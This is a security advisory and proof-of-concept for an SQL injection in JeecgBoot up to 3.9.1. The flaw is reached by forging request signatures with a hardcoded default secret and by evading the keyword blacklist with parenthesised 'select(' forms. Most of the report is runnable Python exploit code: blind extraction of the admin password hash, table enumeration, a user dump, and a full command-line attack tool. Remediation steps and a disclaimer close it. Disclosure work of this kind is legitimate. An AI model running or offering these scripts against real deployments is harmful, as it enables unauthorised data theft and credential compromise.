# JeecgBoot SQL Injection via Signature Bypass and Blacklist Bypass

## Vulnerability Description

The dictionary query endpoint `/sys/api/queryFilterTableDictInfo` in JeecgBoot contains a SQL injection vulnerability caused by two compounding security flaws:

1. **Signature Bypass**: The endpoint enforces signature verification (`@SignatureCheck`), but due to differences in JSON serialization behavior between Java (fastjson) and other languages (e.g. Python), an attacker can reproduce a valid signature by sorting parameters alphabetically, effectively bypassing the signature check.
2. **Blacklist Bypass**: After passing signature verification, the `filterSql` parameter is checked by `SqlInjectionUtil.specialFilterContentForDictSql`. However, the blacklist only matches keywords followed by a space (e.g. `select `). Using `select(` without a space bypasses the check entirely.

- **Vulnerability Type**: SQL Injection (CWE-89)
- **Severity**: HIGH
- **CVSS 3.1 Score**: 8.1
- **Affected Version**: JeecgBoot ≤ 3.9.1
- **Vulnerable Endpoint**: `GET /sys/api/queryFilterTableDictInfo`
- **Authentication Required**: Yes — valid JWT token and signature required
- **Attack Complexity**: Medium (requires bypassing both signature and blacklist)

## Vulnerability Analysis

### Data Flow

```
User-supplied filterSql parameter
    │
    ▼
Signature check (SignUtil.getParamsSign)
    │  Flaw: parameter key ordering is predictable, bypassable from any language
    ▼
SqlInjectionUtil.specialFilterContentForDictSql
    │  Flaw: keywords require trailing space (e.g. "select "), so "select(" is not blocked
    ▼
SQL concatenation: SELECT ... FROM ${table} WHERE ${filterSql}
    │  User input directly interpolated via ${}
    ▼
MyBatis XML execution:
<select id="..." resultType="...">
    SELECT * FROM ${table}
    WHERE ${filterSql}
</select>
    ▼
SQL injection succeeds
```

### Vulnerability 1: Signature Bypass

**File**: `jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/util/SignUtil.java`

```java
public static String getParamsSign(SortedMap<String, String> params) {
    params.remove("_t");
    String paramsJsonStr = JSONObject.toJSONString(params);  // fastjson serialization
    String signatureSecret = SignUtil.getSignatureSecret();
    return DigestUtils.md5DigestAsHex(
        (paramsJsonStr + signatureSecret).getBytes("UTF-8")
    ).toUpperCase();
}
```

The sign secret is hardcoded in configuration: `dd05f1c54d63749eda95f9fa6d49v442a`

When fastjson serializes a `TreeMap` (or `SortedMap`), it outputs keys in natural (alphabetical) order. This is identical to Python's `json.dumps` on a sorted `OrderedDict` with `separators=(',', ':')`. An attacker can therefore reproduce the exact same JSON string and compute an identical MD5 signature without access to the server-side secret — the secret itself is also exposed in the default configuration file.

### Vulnerability 2: Blacklist Bypass

**File**: `jeecg-boot-base-core/src/main/java/org/jeecg/common/util/SqlInjectionUtil.java`

```java
// Blacklist definition — note trailing spaces on keywords
private static String specialDictSqlXssStr =
    "exec |peformance_schema|information_schema|extractvalue|updatexml|"
    "geohash|gtid_subset|gtid_subtract|insert |select |delete |update |"
    "drop |count |chr |mid |master |truncate |char |declare |;|+|--";

// Detection logic
if (value.indexOf(xssArr[i]) > -1) {
    throw new JeecgSqlInjectionException(...);
}
```

Because the blacklist matches `select ` (with a trailing space), wrapping the keyword in parentheses — `select(` — is not detected:

| Blacklisted Keyword | Bypass Form | Reason |
|---------------------|-------------|--------|
| `select ` | `select(` | No trailing space, not matched |
| `from ` | `from(` | Parenthesis form, no space |
| `where ` | `where(` | Parenthesis form, no space |
| `union ` | `union(` | Same pattern |
| `exec ` | `exec(` | Same pattern |

### SQL Injection Sink

**File**: `jeecg-module-system/jeecg-system-biz/src/main/resources/mapper/SysDictMapper.xml`

```xml
<select id="queryFilterTableDictInfo" parameterType="java.util.Map" resultType="java.util.Map">
    SELECT * FROM ${table}
    WHERE 1=1
    <if test="filterSql != null and filterSql != ''">
        AND ${filterSql}
    </if>
    <if test="txt != null and txt != ''">
        AND ${txt} LIKE '%${text}%'
    </if>
</select>
```

Both `${table}` and `${filterSql}` are interpolated directly as raw SQL strings via MyBatis `${}` syntax, which provides no parameterization. The blacklist is the only defense, and it is bypassable as described above.

## Proof of Concept

### Environment

- Target: JeecgBoot 3.9.1
- Base URL: `http://target:8080/jeecg-boot/`
- Test credentials: admin / 123456
- Sign secret: `dd05f1c54d63749eda95f9fa6d49v442a`

### Step 1: Obtain JWT Token

```bash
curl -X POST http://target:8080/jeecg-boot/sys/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'
```

### Step 2: Compute a Valid Signature (Signature Bypass)

```python
import hashlib
import json
from collections import OrderedDict

params = OrderedDict([
    ("code", "username"),
    ("filterSql", "1=1"),
    ("table", "sys_user"),
    ("text", "username")
])

json_str = json.dumps(params, separators=(',', ':'))
sign = hashlib.md5((json_str + "dd05f1c54d63749eda95f9fa6d49v442a").encode()).hexdigest().upper()
print(sign)
```

Because the keys are sorted alphabetically, the Python output matches fastjson's serialization, producing an accepted signature.

### Step 3: Baseline Query

```python
import hashlib, json, time, requests
from collections import OrderedDict

BASE_URL = "http://localhost:8080/jeecg-boot"
SECRET   = "dd05f1c54d63749eda95f9fa6d49v442a"

def sign(params):
    s = OrderedDict(sorted(params.items()))
    return hashlib.md5((json.dumps(s, separators=(',',':')) + SECRET).encode()).hexdigest().upper()

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token  = login()
params = {"table":"sys_user","text":"username","code":"username","filterSql":"1=1"}
ts     = str(int(time.time() * 1000))

resp = requests.get(
    f"{BASE_URL}/sys/api/queryFilterTableDictInfo",
    params=params,
    headers={"X-Access-Token":token, "X-SIGN":sign(params), "X-TIMESTAMP":ts},
    timeout=10
)
print(resp.status_code)
print(resp.text)
```

Response — all user records returned:

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417145639199.png)

### Step 4: Subquery Injection (Blacklist Bypass)

```python
import hashlib, json, time, requests
from collections import OrderedDict

BASE_URL = "http://localhost:8080/jeecg-boot"
SECRET   = "dd05f1c54d63749eda95f9fa6d49v442a"

def sign(params):
    s = OrderedDict(sorted(params.items()))
    return hashlib.md5((json.dumps(s, separators=(',',':')) + SECRET).encode()).hexdigest().upper()

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token  = login()
params = {
    "table":"sys_user","text":"username","code":"username",
    "filterSql":"id=(select(id)from(sys_user)where(username='admin'))"
}
ts = str(int(time.time() * 1000))

resp = requests.get(
    f"{BASE_URL}/sys/api/queryFilterTableDictInfo",
    params=params,
    headers={"X-Access-Token":token, "X-SIGN":sign(params), "X-TIMESTAMP":ts},
    timeout=10
)
print(resp.status_code)
print(resp.text)
```

The subquery executes successfully. `select(id)` is not matched by the `select ` blacklist entry:

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417145858919.png)

### Step 5: Cross-Table Enumeration

MySQL subqueries must return a single row. Multi-row tables (e.g. `sys_permission`) require `LIMIT 1 OFFSET n` to enumerate row by row, otherwise the query returns "Subquery returns more than 1 row":

```python
import hashlib, json, time, requests
from collections import OrderedDict

BASE_URL = "http://localhost:8080/jeecg-boot"
SECRET   = "dd05f1c54d63749eda95f9fa6d49v442a"

def sign(params):
    s = OrderedDict(sorted(params.items()))
    return hashlib.md5((json.dumps(s, separators=(',',':')) + SECRET).encode()).hexdigest().upper()

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token = login()

for offset in range(5):
    params = {
        "table":"sys_user","text":"username","code":"username",
        "filterSql":f"id=(select(id)from(sys_permission)limit 1 offset {offset})"
    }
    ts = str(int(time.time() * 1000))
    resp = requests.get(
        f"{BASE_URL}/sys/api/queryFilterTableDictInfo",
        params=params,
        headers={"X-Access-Token":token, "X-SIGN":sign(params), "X-TIMESTAMP":ts},
        timeout=10
    )
    print(f"offset={offset}  {resp.status_code}  {resp.text[:120]}")
```

### Step 6: Boolean-Based Blind Injection — Extract Password Hash

A non-empty array response means the condition is true; an empty `[]` means false. Using this oracle, the admin password hash can be extracted character by character:

```python
import hashlib, json, time, requests
from collections import OrderedDict

BASE_URL = "http://localhost:8080/jeecg-boot"
SECRET   = "dd05f1c54d63749eda95f9fa6d49v442a"

def sign(params):
    s = OrderedDict(sorted(params.items()))
    return hashlib.md5((json.dumps(s, separators=(',',':')) + SECRET).encode()).hexdigest().upper()

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

def ask(token, payload):
    params = {"table":"sys_user","text":"username","code":"username","filterSql":payload}
    ts = str(int(time.time() * 1000))
    r = requests.get(
        f"{BASE_URL}/sys/api/queryFilterTableDictInfo",
        params=params,
        headers={"X-Access-Token":token, "X-SIGN":sign(params), "X-TIMESTAMP":ts},
        timeout=10
    )
    return r.text.startswith('[') and r.json()

token = login()

# Determine password length
length = 0
for i in range(1, 64):
    if ask(token, f"id=(select(id)from(sys_user)where(username='admin'and(length(password)={i})))"):
        length = i
        break

print(f"[+] Password length: {length}")

# Extract character by character
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"
result = ""
for pos in range(1, length + 1):
    for c in CHARSET:
        if ask(token, f"id=(select(id)from(sys_user)where(username='admin'and(substr(password,{pos},1)='{c}')))"):
            result += c
            print(f"  [{pos}/{length}] = '{c}'  =>  {result}")
            break
    else:
        result += "?"

print(f"\n[+] admin password hash: {result}")
```

Extracted result:

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417145948099.png)

| Field | Value |
|-------|-------|
| admin password hash | `cb362cfeefbf3d8d` (16-char MD5, fully extracted) |
| Hash length | 16 characters |

### Blacklist Bypass Summary

| Payload | Result | Notes |
|---------|--------|-------|
| `1=1` | ✅ Allowed | Baseline |
| `union select 1,2,3` | ❌ Blocked | Matches `select ` |
| `select version()` | ❌ Blocked | Matches `select ` |
| `select(version())` | ❌ Blocked | Matches regex `user[\s]*\(` |
| `sleep(3)` | ❌ Blocked | Matches regex `sleep\s*\(` |
| `select(id)from(sys_user)` | ✅ **Bypassed** | No space, not matched |
| `substr(password,1,1)='c'` | ✅ **Bypassed** | No space, not matched |
| `if(1=1,sleep(0),0)` | ❌ Blocked | Matches keyword `if` |
| `benchmark(100000,sha1('a'))` | ✅ **Bypassed** | Not in blacklist |

## Full PoC Script

```python
#!/usr/bin/env python3
"""
JeecgBoot SQL Injection PoC
Endpoint : GET /sys/api/queryFilterTableDictInfo
Bypasses : Signature bypass + select() no-space blacklist bypass
"""
import hashlib
import json
import time
import requests
from collections import OrderedDict
import argparse


class SqliExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.token = None
        self.sign_secret = "dd05f1c54d63749eda95f9fa6d49v442a"

    def login(self, username="admin", password="123456"):
        resp = requests.post(
            f"{self.base_url}/sys/login",
            json={"username": username, "password": password}
        )
        data = resp.json()
        if data.get("success"):
            self.token = data["result"]["token"]
            print(f"[+] Logged in as: {username}")
            return True
        print(f"[-] Login failed: {data.get('message')}")
        return False

    def calc_sign(self, params):
        """Compute signature: sort keys alphabetically, JSON-serialize, append secret, MD5"""
        sorted_params = OrderedDict(sorted(params.items()))
        json_str = json.dumps(sorted_params, separators=(',', ':'))
        return hashlib.md5((json_str + self.sign_secret).encode('utf-8')).hexdigest().upper()

    def sqli(self, filter_sql, table="sys_user", text="username", code="username"):
        """Send an injected request"""
        params = {
            "table": table,
            "text": text,
            "code": code,
            "filterSql": filter_sql
        }
        timestamp = str(int(time.time() * 1000))
        headers = {
            "X-Access-Token": self.token,
            "X-SIGN": self.calc_sign(params),
            "X-TIMESTAMP": timestamp
        }
        resp = requests.get(
            f"{self.base_url}/sys/api/queryFilterTableDictInfo",
            params=params,
            headers=headers
        )
        if resp.text.startswith('['):
            return resp.json()
        return None

    def test_sqli(self):
        """Run blacklist bypass test cases"""
        print("\n[*] SQL Injection Blacklist Bypass Test")
        print("-" * 50)

        payloads = [
            ("1=1", "Baseline query"),
            ("id=(select(id)from(sys_user))", "Subquery"),
            ("username='admin'", "Conditional filter"),
            ("length(password)>0", "Length function"),
            ("ascii(substr(username,1,1))=97", "ASCII blind injection"),
        ]

        for payload, desc in payloads:
            result = self.sqli(payload)
            if result is not None:
                print(f"[+] {desc}: passed ({len(result)} row(s))")
                if result:
                    print(f"    Data: {result[0]}")
            else:
                print(f"[-] {desc}: blocked")

    def blind_extract_hash(self, username="admin", field="password"):
        """Boolean-based blind injection to extract a field value"""
        print(f"\n[*] Blind extraction: {username}.{field}")
        print("-" * 50)

        length = 0
        for i in range(1, 50):
            payload = f"id=(select(id)from(sys_user)where(username='{username}'and(length({field}))={i}))"
            result = self.sqli(payload)
            if result and len(result) > 0:
                length = i
                print(f"[+] {field} length: {length}")
                break

        if length == 0:
            print("[-] Could not determine length")
            return None

        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        value = ""

        for pos in range(1, length + 1):
            found = False
            for char in charset:
                payload = f"id=(select(id)from(sys_user)where(username='{username}'and(substr({field},{pos},1)='{char}')))"
                result = self.sqli(payload)
                if result and len(result) > 0:
                    value += char
                    print(f"[+] pos {pos}: '{char}'  =>  {value}")
                    found = True
                    break
            if not found:
                value += "?"
                print(f"[-] pos {pos}: unknown character")

        print(f"\n[+] Extracted value: {value}")
        return value

    def list_tables(self):
        """Probe common table names"""
        print("\n[*] Table enumeration")
        print("-" * 50)
        common_tables = [
            "sys_user", "sys_role", "sys_permission", "sys_department",
            "sys_data_source", "sys_fill_rule", "sys_dict", "sys_log",
            "quartz_job", "onl_cgform_head", "onl_cgform_field"
        ]
        for table in common_tables:
            payload = f"id=(select(id)from({table})limit 1)"
            result = self.sqli(payload)
            status = "exists" if result else "not found / no match"
            print(f"[{'+' if result else '-'}] {table}: {status}")

    def dump_users(self):
        """Dump all rows from sys_user visible through the endpoint"""
        print("\n[*] Dumping user records")
        print("-" * 50)

        result = self.sqli("1=1")
        if result:
            print(f"[+] {len(result)} user record(s):")
            for user in result:
                print(f"    - {user}")
        else:
            print("[-] Query failed")


def main():
    parser = argparse.ArgumentParser(description="JeecgBoot SQL Injection PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="123456")
    parser.add_argument("--test",    action="store_true", help="Run blacklist bypass tests")
    parser.add_argument("--extract", action="store_true", help="Blind-inject admin password hash")
    parser.add_argument("--tables",  action="store_true", help="Enumerate tables")
    parser.add_argument("--dump",    action="store_true", help="Dump user records")

    args = parser.parse_args()
    exploit = SqliExploit(args.url)

    if not exploit.login(args.username, args.password):
        return

    if args.test:    exploit.test_sqli()
    if args.extract: exploit.blind_extract_hash("admin", "password")
    if args.tables:  exploit.list_tables()
    if args.dump:    exploit.dump_users()

    if not any([args.test, args.extract, args.tables, args.dump]):
        exploit.test_sqli()
        print("\n[*] Use --extract to retrieve the admin password hash via blind injection")


if __name__ == "__main__":
    main()
```

**Usage:**

```bash
# Run blacklist bypass tests
python poc.py -u http://target:8080/jeecg-boot --test

# Enumerate tables
python poc.py -u http://target:8080/jeecg-boot --tables

# Dump user records
python poc.py -u http://target:8080/jeecg-boot --dump

# Extract admin password hash via blind injection
python poc.py -u http://target:8080/jeecg-boot --extract
```

## Remediation

1. **Use parameterized queries**: Replace `${filterSql}` with `#{}` in MyBatis XML to prevent raw SQL interpolation.
2. **Fix the blacklist**: Remove the trailing-space requirement from blocked keywords, or add explicit checks for the `keyword(` form.
3. **Add regex-based detection**: Block patterns like `\bselect\s*\(` to cover parenthesis-based bypass attempts.
4. **Whitelist `filterSql`**: Restrict `filterSql` to a strict allowlist of characters (letters, digits, parentheses, comparison operators) and reject anything else.
5. **Normalize the signing algorithm**: Adopt a canonical, language-agnostic signing specification (e.g. HMAC-SHA256 with URL-encoded sorted key=value pairs) to eliminate cross-language serialization discrepancies.

## Disclaimer

This report is intended solely for security research and authorized penetration testing. Unauthorized use of this information against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for any misuse.
